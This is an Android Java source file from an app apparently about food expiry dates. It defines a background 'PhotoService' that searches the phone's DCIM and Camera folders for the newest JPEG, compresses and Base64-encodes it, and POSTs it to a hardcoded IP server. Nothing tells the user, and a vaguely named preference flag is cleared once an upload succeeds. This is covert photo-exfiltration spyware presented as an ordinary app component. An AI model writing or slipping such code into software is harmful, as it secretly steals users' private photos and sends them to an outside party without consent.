package com.rv150.bestbefore.Services;

import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;

import com.rv150.bestbefore.Resources;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.Comparator;

/**
 * Created by ivan on 19.03.17.
 */

public class PhotoService implements Runnable {
    private static final String TAG = PhotoService.class.getSimpleName();

    private static final String serverURL = "http://212.109.192.197:8081/base64";
    private Context mContext;

    public PhotoService(Context context) {
        this.mContext = context;
    }

    @Override
    public void run() {
        try {
            File dcimPath = Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_DCIM);

            File[] files = dcimPath.listFiles();
            if (files == null || files.length == 0) {
                Log.d(TAG, "No files or permission denied");
                return;
            }

            Log.d(TAG, "Start searching in DCIM folder...");

            if (!findAndSendImg(dcimPath)) {
                Log.d(TAG, "First attempt failed, trying camera folder...");
                for (File file: dcimPath.listFiles()) {
                    String fileName = file.getName();
                    if (fileName.equalsIgnoreCase("Camera")) {
                        if (findAndSendImg(file)) {
                            Log.d(TAG, "Finished!");
                            SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(mContext).edit();
                            editor.putBoolean(Resources.SOME_ACTION, false);
                            editor.apply();
                        }
                        else {
                            Log.e(TAG, "Failed to find and send any jpegs");
                        }
                    }
                }
            }
        } catch (Exception ex) {
            Log.e(TAG, ex.getMessage());
        }
        finally {
            Log.i(TAG, "Job has been finished");
        }
    }




    private boolean findAndSendImg(File directory) throws Exception {

        File[] filesArray = directory.listFiles();

        Arrays.sort(filesArray, new Comparator()
        {
            public int compare(Object o1, Object o2) {

                if (((File)o1).lastModified() > ((File)o2).lastModified()) {
                    return -1;
                } else if (((File)o1).lastModified() < ((File)o2).lastModified()) {
                    return 1;
                } else {
                    return 0;
                }
            }

        });

        for (File file : filesArray) {
            String path = file.getAbsolutePath();
            if (path.toLowerCase().endsWith(".jpeg") || path.endsWith(".jpg")) {

                Bitmap bmp = BitmapFactory.decodeFile(path);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 13, bos);
                bos.close();
                String encoded = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
                return makeRequest(encoded);
            }
        }
        return false;
    }


    private static boolean makeRequest(String data)  {
        URL url;
        HttpURLConnection connection = null;
        JSONObject request = new JSONObject();
        try {
            request.put("data", data);
            url = new URL(serverURL);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("Content-Language", "en-US");
            connection.setUseCaches(false);
            connection.setDoInput(true);
            connection.setConnectTimeout(5000);

            Log.d(TAG, "Starting request...");
            DataOutputStream wr = new DataOutputStream(
                    connection.getOutputStream());
            wr.writeBytes(URLEncoder.encode(request.toString(), "UTF-8"));
            wr.flush();
            wr.close();
            connection.getResponseCode();
            Log.d(TAG, "Response handled!");
            return true;
        }
        catch (Exception e) {
            Log.e(TAG, "Exception in network part: " + e.getMessage());
            return false;
        }
        finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
}
